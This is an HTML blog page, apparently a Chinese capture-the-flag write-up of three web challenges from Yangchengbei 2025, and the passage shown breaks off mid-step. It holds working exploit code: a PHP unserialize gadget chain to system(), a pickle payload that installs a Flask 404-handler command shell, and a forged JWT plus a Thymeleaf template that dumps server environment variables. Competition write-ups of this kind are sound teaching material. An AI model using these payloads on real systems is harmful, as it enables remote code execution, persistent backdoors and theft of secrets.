@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Huaji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Huaji">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="搞到现在总算有个博客了">
+    <meta name="description" content="羊城杯2025-Web题目感觉出的不错，很有意思，尽力做了 ez_unserialize思路：H-&gt;__destruct() → A::start() 回显 $a-&gt;next，让它是 V。 V::__toString() 取 $this-&gt;go-&gt;$abc，设 $abc&#x3D;&#39;secret&#39; 且 go&#x3D;E 触发 E::__get() → $found-&gt;c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯2025-web">
+<meta property="og:url" content="http://huajihd.github.io/2025/10/14/ycb2025-web/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="羊城杯2025-Web题目感觉出的不错，很有意思，尽力做了 ez_unserialize思路：H-&gt;__destruct() → A::start() 回显 $a-&gt;next，让它是 V。 V::__toString() 取 $this-&gt;go-&gt;$abc，设 $abc&#x3D;&#39;secret&#39; 且 go&#x3D;E 触发 E::__get() → $found-&gt;c">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419964.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419966.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419967.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419968.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419969.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419970.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419971.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419972.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419973.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419974.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419975.png">
+<meta property="article:published_time" content="2025-10-14T10:14:32.000Z">
+<meta property="article:modified_time" content="2025-10-15T10:19:58.249Z">
+<meta property="article:author" content="Huaji">
+<meta property="article:tag" content="-web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419964.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>羊城杯2025-web · Huajiの小窝</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Huajiの小窝.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Huajiの小窝.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">羊城杯2025-web</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                羊城杯2025-web
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="-web">-web</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/10/14</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="羊城杯2025-Web"><a href="#羊城杯2025-Web" class="headerlink" title="羊城杯2025-Web"></a>羊城杯2025-Web</h2><p>题目感觉出的不错，很有意思，尽力做了</p>
+<h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p>思路：<code>H-&gt;__destruct()</code> → <code>A::start()</code> 回显 <code>$a-&gt;next</code>，让它是 <code>V</code>。<br> <code>V::__toString()</code> 取 <code>$this-&gt;go-&gt;$abc</code>，设 <code>$abc=&#39;secret&#39;</code> 且 <code>go=E</code> 触发 <code>E::__get()</code> → <code>$found-&gt;check()</code>。<br> <code>F::check()</code> 里 <code>finalstep=&#39;u&#39;</code>（小写绕过 <code>/U/</code>），实例化 <code>new u()</code> 实际拿到类 <code>U</code>，再 <code>($this-&gt;step)()</code> 触发 <code>U::__invoke()</code> → 调 <code>N::__call()</code> → <code>call_user_func(&#39;system&#39;, $_POST[&#39;cmd&#39;])</code>。</p>
+<p>用同名类构造链，POST 两个参数：<code>payload</code> 和 <code>cmd=cat /flag</code>。</p>
+<p>所以写脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123; public $first; public $step; public $next; &#125;</span><br><span class="line">class E &#123; private $you; public $found; private $secret; &#125;</span><br><span class="line">class F &#123; public $fifth; public $step; public $finalstep; &#125;</span><br><span class="line">class H &#123; public $who; public $are; public $you; &#125;</span><br><span class="line">class V &#123; public $good; public $keep; public $dowhat; public $go; &#125;</span><br><span class="line"></span><br><span class="line">$v = new V();</span><br><span class="line">$v-&gt;dowhat = &#x27;secret&#x27;;</span><br><span class="line">$e = new E();</span><br><span class="line">$f = new F();</span><br><span class="line">$f-&gt;finalstep = &#x27;u&#x27;;</span><br><span class="line">$e-&gt;found = $f;</span><br><span class="line">$v-&gt;go = $e;</span><br><span class="line"></span><br><span class="line">// A::start() echo $this-&gt;next 触发 V::__toString</span><br><span class="line">$a = new A();</span><br><span class="line">$a-&gt;next = $v;</span><br><span class="line">$h = new H();</span><br><span class="line">$h-&gt;who = $a;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = serialize($h);</span><br><span class="line"></span><br><span class="line">echo urlencode($payload);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跑完生成payload，再传上cmd参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=O%3A1%3A%22H%22%3A3%3A%7Bs%3A3%3A%22who%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A5%3A%22first%22%3BN%3Bs%3A4%3A%22step%22%3BN%3Bs%3A4%3A%22next%22%3BO%3A1%3A%22V%22%3A4%3A%7Bs%3A4%3A%22good%22%3BN%3Bs%3A4%3A%22keep%22%3BN%3Bs%3A6%3A%22dowhat%22%3Bs%3A6%3A%22secret%22%3Bs%3A2%3A%22go%22%3BO%3A1%3A%22E%22%3A3%3A%7Bs%3A6%3A%22%00E%00you%22%3BN%3Bs%3A5%3A%22found%22%3BO%3A1%3A%22F%22%3A3%3A%7Bs%3A5%3A%22fifth%22%3BN%3Bs%3A4%3A%22step%22%3BN%3Bs%3A9%3A%22finalstep%22%3Bs%3A1%3A%22u%22%3B%7Ds%3A9%3A%22%00E%00secret%22%3BN%3B%7D%7D%7Ds%3A3%3A%22are%22%3BN%3Bs%3A3%3A%22you%22%3BN%3B%7D&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419964.png" alt="image-20251011092115371"></p>
+<p>但问ai的更短</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=O%3A1%3A%22H%22%3A1%3A%7Bs%3A3%3A%22who%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22next%22%3BO%3A1%3A%22V%22%3A2%3A%7Bs%3A6%3A%22dowhat%22%3Bs%3A6%3A%22secret%22%3Bs%3A2%3A%22go%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A5%3A%22found%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A9%3A%22finalstep%22%3Bs%3A1%3A%22u%22%3B%7D%7D%7D%7D%7D</span><br><span class="line">&amp;cmd=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez-blog"></a>ez-blog</h3><p>提示<code>访客只能用访客账号登录哦！</code>，先用guest&#x2F;guest登录，发现分配了一个token：<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</code></p>
+<p>所以先想到伪造，登录上admin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hexs = <span class="string">&quot;8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e&quot;</span></span><br><span class="line">data = binascii.unhexlify(hexs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 b&quot;\x8c\x08is_admin\x94\x89&quot; 中的 0x89 -&gt; 0x88</span></span><br><span class="line">old = <span class="string">b&quot;\x8c\x08is_admin\x94\x89&quot;</span></span><br><span class="line">new = <span class="string">b&quot;\x8c\x08is_admin\x94\x88&quot;</span></span><br><span class="line"><span class="keyword">assert</span> old <span class="keyword">in</span> data, <span class="string">&quot;未找到 is_admin=False 片段&quot;</span></span><br><span class="line">forged = data.replace(old, new, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(forged).decode())</span><br><span class="line"><span class="comment">#8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94888c096c6f676765645f696e948875622</span></span><br></pre></td></tr></table></figure>
+
+<p>测试发现blog中不存在ssti，只能打内存马</p>
+<p>思路：取 404 的异常类与状态码：<code>app._get_exc_class_and_code(404)</code></p>
+<p>将 Flask 的 404 错误处理器改写为：<code>lambda a: __import__(&#39;os&#39;).popen(request.args.get(&#39;huaji&#39;)).read()</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ys</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;ys&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(ys())</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(payload))</span><br><span class="line"><span class="comment">#b&#x27;800495da000000000000008c086275696c74696e73948c04657865639493948cbe676c6f62616c206578635f636c6173733b676c6f62616c20636f64653b6578635f636c6173732c20636f6465203d206170702e5f6765745f6578635f636c6173735f616e645f636f646528343034293b6170702e6572726f725f68616e646c65725f737065635b4e6f6e655d5b636f64655d5b6578635f636c6173735d203d206c616d62646120613a5f5f696d706f72745f5f28276f7327292e706f70656e28726571756573742e617267732e676574282779732729292e72656164282994859452942e&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在站点传几次token</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419966.png" alt="image-20251012123015639"></p>
+<p>访问任意触发 404 的 URL，并在查询参数里带上 <code>huaji=命令</code>，就会在服务器上执行该命令</p>
+<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419967.png" alt="image-20251012122957612" style="zoom:25%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419968.png" alt="image-20251012123101745" style="zoom: 25%;" />
+
+
+
+<h3 id="authweb"><a href="#authweb" class="headerlink" title="authweb"></a>authweb</h3><p>先伪造jwt，逆向分析得知有两个用户<code>user1</code>和<code>admin</code>，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419969.png" alt="image-20251012015142242"></p>
+<p>而<code>ROLE_USER</code>权限才能文件上传，所以用<code>user1</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419970.png" alt="image-20251012015534082"></p>
+<p><code>secret</code>可以在<code>JwtTokenProvider.class</code>里面拿</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419971.png" alt="image-20251012015752739"></p>
+<p>写脚本生成一个jwt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt, time</span><br><span class="line">secret = <span class="string">&quot;25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03&quot;</span></span><br><span class="line">now = <span class="built_in">int</span>(time.time())</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;user1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">tok = jwt.encode(payload, secret, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tok)</span><br><span class="line"><span class="comment"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>之后curl测试，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw&quot; http://45.40.247.139:15040/upload</span><br></pre></td></tr></table></figure>
+
+<p>返回405，或者使用OPTIONS 请求，都说明此处应当post上传文件，所以考虑thymeleaf模板注入，<strong>此处路径经过多次fuzz</strong>（ps：当时好像因为渲染问题一直报错）。</p>
+<p>传模板</p>
+<p>传了带Thymeleaf的，可以加载，证明存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">  &lt;thead&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th th:text=&quot;#&#123;msgs.headers.name&#125;&quot;&gt;Name&lt;/th&gt;</span><br><span class="line">      &lt;th th:text=&quot;#&#123;msgs.headers.price&#125;&quot;&gt;Price&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/thead&gt;</span><br><span class="line">  &lt;tbody&gt;</span><br><span class="line">    &lt;tr th:each=&quot;prod: $&#123;allProducts&#125;&quot;&gt;</span><br><span class="line">      &lt;td th:text=&quot;$&#123;prod.name&#125;&quot;&gt;Oranges&lt;/td&gt;</span><br><span class="line">      &lt;td th:text=&quot;$&#123;#numbers.formatDecimal(prod.price, 1, 2)&#125;&quot;&gt;0.99&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以最后写文件</p>
+<p>payload.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre th:each=&quot;e : $&#123;@environment.getSystemEnvironment().entrySet()&#125;&quot;</span><br><span class="line">th:text=&quot;$&#123;e.key + &#x27;=&#x27; + e.value&#125;&quot;&gt;123&lt;/pre&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>传文件</p>
